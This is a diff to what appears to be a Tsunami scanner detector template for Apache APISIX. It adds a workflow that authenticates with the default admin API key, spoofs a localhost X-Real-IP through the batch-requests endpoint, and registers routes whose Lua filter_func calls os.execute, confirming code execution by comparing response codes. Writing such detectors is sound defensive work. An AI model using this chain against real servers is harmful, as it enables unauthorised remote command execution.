@@ -122,6 +122,165 @@ actions: {
   callback_server: { action_type: CHECK }
 }
 
+# Non-callback actions below this. 
+# They work by comparing response codes for a route that returns true or false.
+
+actions: {
+  name: "register_route_1"
+  http_request: {
+    method: POST
+    uri: "/apisix/batch-requests"
+    data: 
+      '{'
+      '  "headers": {'
+      '    "X-Real-IP": "{{ X_REAL_IP }}",'
+      '    "X-API-KEY": "{{ DEFAULT_API_KEY }}",'
+      '    "Content-Type": "application/json"'
+      '  },'
+      '  "timeout": 1500,'
+      '  "pipeline": ['
+      '    {'
+      '      "path": "/apisix/admin/routes/tsunami_rce_1?ttl=30",'
+      '      "method": "PUT",'
+      '      "body": "{\\"uri\\":\\"/tsunami_rce/{{ T_UTL_CURRENT_TIMESTAMP_MS }}_1\\",\\"upstream\\":{\\"type\\":\\"roundrobin\\",\\"nodes\\":{}},\\"name\\":\\"{{ T_UTL_CURRENT_TIMESTAMP_MS }}\\",\\"filter_func\\":\\"{{ PIPE_REQ_FILTER_FUNC_1 }}\\"}"'
+      '    }'
+      '  ]'
+      '}'
+    response: {
+      http_status: 200
+      expect_any: {
+        conditions: { body {} contains: '"status":200' },
+        conditions: { body {} contains: '"status":201' }
+      }
+    }
+  }
+  cleanup_actions: "cleanup_route_1"
+}
+
+actions: {
+  name: "register_route_2"
+  http_request: {
+    method: POST
+    uri: "/apisix/batch-requests"
+    data: 
+      '{'
+      '  "headers": {'
+      '    "X-Real-IP": "{{ X_REAL_IP }}",'
+      '    "X-API-KEY": "{{ DEFAULT_API_KEY }}",'
+      '    "Content-Type": "application/json"'
+      '  },'
+      '  "timeout": 1500,'
+      '  "pipeline": ['
+      '    {'
+      '      "path": "/apisix/admin/routes/tsunami_rce_2?ttl=30",'
+      '      "method": "PUT",'
+      '      "body": "{\\"uri\\":\\"/tsunami_rce/{{ T_UTL_CURRENT_TIMESTAMP_MS }}_2\\",\\"upstream\\":{\\"type\\":\\"roundrobin\\",\\"nodes\\":{}},\\"name\\":\\"{{ T_UTL_CURRENT_TIMESTAMP_MS }}\\",\\"filter_func\\":\\"{{ PIPE_REQ_FILTER_FUNC_2 }}\\"}"'
+      '    }'
+      '  ]'
+      '}'
+    response: {
+      http_status: 200
+      expect_any: {
+        conditions: { body {} contains: '"status":200' },
+        conditions: { body {} contains: '"status":201' }
+      }
+    }
+  }
+  cleanup_actions: "cleanup_route_2"
+}
+
+actions: {
+  name: "sleep_longer"
+  utility: { sleep: { duration_ms: 2000 } }
+}
+
+# check if our first route is true
+
+actions: {
+  name: "execute_route_1"
+  http_request: {
+    method: GET
+    uri: "/tsunami_rce/{{ T_UTL_CURRENT_TIMESTAMP_MS }}_1"
+    response: {
+      http_status: 200
+    }
+  }
+}
+
+# check if our second route is false
+
+actions: {
+  name: "execute_route_2"
+  http_request: {
+    method: GET
+    uri: "/tsunami_rce/{{ T_UTL_CURRENT_TIMESTAMP_MS }}_2"
+    response: {
+      http_status: 404
+    }
+  }
+}
+
+actions: {
+  name: "cleanup_route_1"
+  http_request: {
+    method: POST
+    uri: "/apisix/batch-requests"
+    data: 
+      '{'
+      '  "headers": {'
+      '    "X-Real-IP": "{{ X_REAL_IP }}",'
+      '    "X-API-KEY": "{{ DEFAULT_API_KEY }}",'
+      '    "Content-Type": "application/json"'
+      '  },'
+      '  "timeout": 1500,'
+      '  "pipeline": ['
+      '    {'
+      '      "path": "/apisix/admin/routes/tsunami_rce_1",'
+      '      "method": "DELETE"'
+      '    }'
+      '  ]'
+      '}'
+    response: {
+      http_status: 200
+      expect_any: {
+        conditions: { body {} contains: '"status":200' },
+        conditions: { body {} contains: '"status":201' }
+      }
+    }
+  }
+}
+
+actions: {
+  name: "cleanup_route_2"
+  http_request: {
+    method: POST
+    uri: "/apisix/batch-requests"
+    data: 
+      '{'
+      '  "headers": {'
+      '    "X-Real-IP": "{{ X_REAL_IP }}",'
+      '    "X-API-KEY": "{{ DEFAULT_API_KEY }}",'
+      '    "Content-Type": "application/json"'
+      '  },'
+      '  "timeout": 1500,'
+      '  "pipeline": ['
+      '    {'
+      '      "path": "/apisix/admin/routes/tsunami_rce_2",'
+      '      "method": "DELETE"'
+      '    }'
+      '  ]'
+      '}'
+    response: {
+      http_status: 200
+      expect_any: {
+        conditions: { body {} contains: '"status":200' },
+        conditions: { body {} contains: '"status":201' }
+      }
+    }
+  }
+}
+
+
 #############
 # WORKFLOWS #
 #############
@@ -142,3 +301,23 @@ workflows: {
     "check_callback_server_logs"
   ]
 }
+
+# for cases where the callback server isn't used
+
+workflows: {
+  variables: [
+    { name: "X_REAL_IP" value: "127.0.0.1" },
+    { name: "DEFAULT_API_KEY" value: "edd1c9f034335f136f87ad84b625c8f1" },
+    { name: "PIPE_REQ_FILTER_FUNC_1" value: "function(vars) return os.execute('echo hello')==true end" },
+    { name: "PIPE_REQ_FILTER_FUNC_2" value: "function(vars) return false end" }
+  ]
+  actions: [
+    "register_route_1",
+    "register_route_2",
+    "sleep_longer",
+    "execute_route_1",
+    "execute_route_2"
+  ]
+}
+
+config: { debug: true }
